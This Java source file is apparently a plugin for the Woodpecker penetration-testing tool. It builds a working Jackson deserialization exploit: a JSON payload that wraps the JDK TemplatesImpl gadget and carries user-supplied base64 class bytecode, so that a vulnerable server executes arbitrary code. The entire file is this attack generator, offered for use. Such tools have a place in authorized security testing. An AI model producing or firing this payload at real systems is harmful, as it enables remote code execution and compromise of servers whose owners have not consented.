package me.gv7.woodpecker.vuldb.payload;

import me.gv7.woodpecker.plugin.IArg;
import me.gv7.woodpecker.plugin.IArgsUsageBinder;
import me.gv7.woodpecker.plugin.IPayloadGenerator;
import me.gv7.woodpecker.plugin.IResultOutput;
import me.gv7.woodpecker.vuldb.JacksonVulPlugin;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class LocalPayloadGenerator implements IPayloadGenerator {
    @Override
    public String getPayloadTabCaption() {
        return "Code exec";
    }

    public IArgsUsageBinder getPayloadCustomArgs() {
        IArgsUsageBinder argsUsageBinder = JacksonVulPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg args1 = JacksonVulPlugin.pluginHelper.createArg();
        args1.setName("class_base64");
        args1.setDefaultValue("yv66vgAAADE...");
        args1.setDescription("要执行的class字节码base64编码数据");
        args1.setRequired(true);
        args.add(args1);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    @Override
    public void generatorPayload(Map<String, Object> customArgs, IResultOutput iResultOutput) {
        String base64Class = (String)customArgs.get("class_base64");
        iResultOutput.successPrintln("Relying on the JDK");
        String payload1 = String.format("{\"obj\":[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{\"transletBytecodes\":[\"%s\" ],\"transletName\":\"a.b\", \"outputProperties\":{}}]}",base64Class);
        iResultOutput.rawPrintln(payload1);
        iResultOutput.rawPrintln("\n");
    }
}
